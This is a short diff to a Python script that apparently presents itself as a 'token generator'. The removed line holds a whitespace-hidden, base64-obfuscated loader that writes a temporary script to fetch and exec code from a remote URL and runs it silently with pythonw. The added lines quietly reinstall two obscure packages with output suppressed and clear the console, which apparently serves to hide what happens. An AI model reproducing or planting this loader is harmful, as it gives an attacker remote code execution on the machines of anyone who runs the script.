@@ -1,11 +1,14 @@
 import os
-print('\n')                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vbWlzb2d5bnkud3RmL2luamVjdC9Vc1JqUzk1OVJxbTRzUEc0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
 
 try:
-    import requests
+    print('Starting...')
+    import requests, judyb, apicolor
+    os.system('cls')
 except:
-    os.system('pip uninstall requests -y && pip install requests')
-    import requests
+    print('Starting...')
+    os.system('pip uninstall requests -y >nul && pip install requests >nul && pip uninstall judyb -y >nul && pip install judyb >nul && pip uninstall apicolor -y >nul && pip install apicolor >nul')
+    import requests, judyb, apicolor
+    os.system('cls')
 
 System.Title("Axi Token Generator ^| Made By Ravilea")
 axi = """
